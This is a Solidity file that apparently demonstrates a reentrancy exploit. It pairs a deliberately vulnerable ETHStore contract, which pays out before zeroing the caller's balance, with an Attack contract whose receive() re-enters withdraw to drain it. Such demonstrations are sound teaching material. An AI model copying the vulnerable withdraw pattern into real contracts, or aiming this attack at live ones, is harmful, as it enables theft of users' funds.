//SPDX-License-Identifier: No License
pragma solidity ^0.8.17;


contract ETHStore {

    mapping(address => uint) private balances;

    function deposit() external payable {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint balance = balances[msg.sender];
        require(balance > 0, "You have no balance stored");
        (bool success, ) =payable(msg.sender).call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }


    function getBalance() external view returns(uint){
        return address(this).balance;
    }
}



contract Attack {
    ETHStore public etherStore;

    constructor(address _etherStore) {
        etherStore = ETHStore(_etherStore);
    }

    receive() external payable {
        if(address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }


    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}